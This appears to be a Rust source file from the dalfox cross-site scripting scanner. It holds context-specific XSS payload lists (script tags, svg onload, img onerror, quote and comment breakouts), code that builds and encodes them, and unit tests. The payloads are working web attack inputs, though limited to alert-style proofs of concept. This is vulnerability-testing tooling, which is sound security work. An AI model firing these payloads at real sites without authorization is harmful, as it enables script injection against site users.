use crate::cmd::scan::ScanArgs;
use crate::encoding::{base64_encode, double_url_encode, html_entity_encode, url_encode};
use crate::parameter_analysis::{DelimiterType, InjectionContext};
use crate::payload::XSS_PAYLOADS;

// Context-specific payload lists
const JAVASCRIPT_PAYLOADS: &[&str] = &[
    "alert(1)",
    "alert('dalfox')",
    "confirm(1)",
    "prompt(1)",
    "console.log('dalfox')",
    "throw 'dalfox'",
    "window.location='javascript:alert(1)'",
    "eval('alert(1)')",
    "setTimeout('alert(1)', 0)",
    "setInterval('alert(1)', 0)",
    "Function('alert(1)')()",
    "new Function('alert(1)')()",
    "document.write('<script>alert(1)</script>')",
    "document.body.innerHTML='<script>alert(1)</script>'",
    "location.href='javascript:alert(1)'",
    "window['alert'](1)",
    "this['alert'](1)",
    "top['alert'](1)",
    "parent['alert'](1)",
    "frames[0]['alert'](1)",
];

const ATTRIBUTE_PAYLOADS: &[&str] = &[
    "onerror=alert(1)",
    "onload=alert(1)",
    "onclick=alert(1)",
    "onmouseover=alert(1)",
    "\"><svg/onload=alert(1)>",
    "'><svg/onload=alert(1)>",
    "\"><img/src=x onerror=alert(1)>",
    "'><img/src=x onerror=alert(1)>",
];

const COMMENT_PAYLOADS: &[&str] = &[
    "--><svg/onload=alert(1)>",
    "--><script>alert(1)</script>",
    "--><img/src=x onerror=alert(1)>",
];

const STRING_SINGLE_PAYLOADS: &[&str] = &[
    "'><svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "'><img/src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "'+alert(1)+'",
];

const STRING_DOUBLE_PAYLOADS: &[&str] = &[
    "\"><svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "\"><img/src=x onerror=alert(1)>",
    "\"-alert(1)-\"",
    "\"+alert(1)+\"",
];

/// Generate dynamic payloads based on the injection context
pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
    let mut payloads = Vec::new();

    match context {
        InjectionContext::StringSingle => {
            for &payload in STRING_SINGLE_PAYLOADS.iter() {
                payloads.push(payload.to_string());
            }
        }
        InjectionContext::StringDouble => {
            for &payload in STRING_DOUBLE_PAYLOADS.iter() {
                payloads.push(payload.to_string());
            }
        }
        InjectionContext::Attribute(delimiter_type) => match delimiter_type {
            Some(DelimiterType::SingleQuote) => {
                for &payload in STRING_SINGLE_PAYLOADS.iter() {
                    payloads.push(payload.to_string());
                }
            }
            Some(DelimiterType::DoubleQuote) => {
                for &payload in STRING_DOUBLE_PAYLOADS.iter() {
                    payloads.push(payload.to_string());
                }
            }
            _ => {
                for &payload in ATTRIBUTE_PAYLOADS.iter() {
                    payloads.push(payload.to_string());
                }
            }
        },
        InjectionContext::Javascript(delimiter_type) => {
            match delimiter_type {
                Some(DelimiterType::SingleQuote) => {
                    // For JavaScript in single quotes, use payloads that escape single quotes
                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
                        payloads.push(format!("'{};'", payload));
                    }
                }
                Some(DelimiterType::DoubleQuote) => {
                    // For JavaScript in double quotes, use payloads that escape double quotes
                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
                        payloads.push(format!("\"{};", payload));
                    }
                }
                _ => {
                    for &payload in JAVASCRIPT_PAYLOADS.iter() {
                        payloads.push(payload.to_string());
                    }
                }
            }
        }
        InjectionContext::Comment(delimiter_type) => match delimiter_type {
            Some(DelimiterType::SingleQuote) => {
                // Comment with single quote, escape quote and comment
                for &payload in COMMENT_PAYLOADS.iter() {
                    payloads.push(format!("'{}", payload));
                }
            }
            Some(DelimiterType::DoubleQuote) => {
                // Comment with double quote, escape quote and comment
                for &payload in COMMENT_PAYLOADS.iter() {
                    payloads.push(format!("\"{}", payload));
                }
            }
            _ => {
                for &payload in COMMENT_PAYLOADS.iter() {
                    payloads.push(payload.to_string());
                }
            }
        },
        InjectionContext::Html => {
            // For general HTML, use original payloads
            for &payload in XSS_PAYLOADS.iter() {
                payloads.push(payload.to_string());
            }
        }
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_dynamic_payloads_comment() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Comment(None));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("-->")));
        assert!(payloads.iter().any(|p| p.contains("<svg/onload=alert(1)>")));
    }

    #[test]
    fn test_generate_dynamic_payloads_string_double() {
        let payloads = generate_dynamic_payloads(&InjectionContext::StringDouble);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"")));
        assert!(
            payloads
                .iter()
                .any(|p| p.contains("\"><svg/onload=alert(1)>"))
        );
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(None));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("onerror=alert(1)")));
        assert!(
            payloads
                .iter()
                .any(|p| p.contains("\"><svg/onload=alert(1)>"))
        );
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute_single_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
            DelimiterType::SingleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("'")));
    }

    #[test]
    fn test_generate_dynamic_payloads_attribute_double_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Attribute(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"")));
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(None));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p == "alert(1)"));
        assert!(payloads.iter().any(|p| p == "console.log('dalfox')"));
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript_single_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
            DelimiterType::SingleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("alert(1)")));
    }

    #[test]
    fn test_generate_dynamic_payloads_javascript_double_quote() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Javascript(Some(
            DelimiterType::DoubleQuote,
        )));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("alert(1)")));
    }

    #[test]
    fn test_generate_dynamic_payloads_comment_single_quote() {
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Comment(Some(DelimiterType::SingleQuote)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("'-->")));
    }

    #[test]
    fn test_generate_dynamic_payloads_comment_double_quote() {
        let payloads =
            generate_dynamic_payloads(&InjectionContext::Comment(Some(DelimiterType::DoubleQuote)));
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.starts_with("\"-->")));
    }

    #[test]
    fn test_generate_dynamic_payloads_html() {
        let payloads = generate_dynamic_payloads(&InjectionContext::Html);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p == "<script>alert(1)</script>"));
    }
}

pub fn load_custom_payloads(path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let content = std::fs::read_to_string(path)?;
    Ok(content.lines().map(|s| s.to_string()).collect())
}

pub fn get_dynamic_payloads(
    context: &InjectionContext,
    args: &ScanArgs,
) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let mut base_payloads = vec![];

    if args.only_custom_payload {
        if let Some(path) = &args.custom_payload {
            base_payloads.extend(load_custom_payloads(path)?);
        }
    } else {
        base_payloads.extend(generate_dynamic_payloads(context));
        if !args.fast_scan {
            if let Some(path) = &args.custom_payload {
                base_payloads.extend(load_custom_payloads(path)?);
            }
        }
    }

    let mut payloads = vec![];
    for payload in base_payloads {
        if args.encoders.contains(&"none".to_string()) {
            payloads.push(payload.clone()); // No encoding
        } else {
            payloads.push(payload.clone()); // Original
            if args.encoders.contains(&"url".to_string()) {
                payloads.push(url_encode(&payload)); // URL encoded
            }
            if args.encoders.contains(&"html".to_string()) {
                payloads.push(html_entity_encode(&payload)); // HTML entity encoded
            }
            if args.encoders.contains(&"2url".to_string()) {
                payloads.push(double_url_encode(&payload)); // Double URL encoded
            }
            if args.encoders.contains(&"base64".to_string()) {
                payloads.push(base64_encode(&payload)); // Base64 encoded
            }
        }
    }

    Ok(payloads)
}
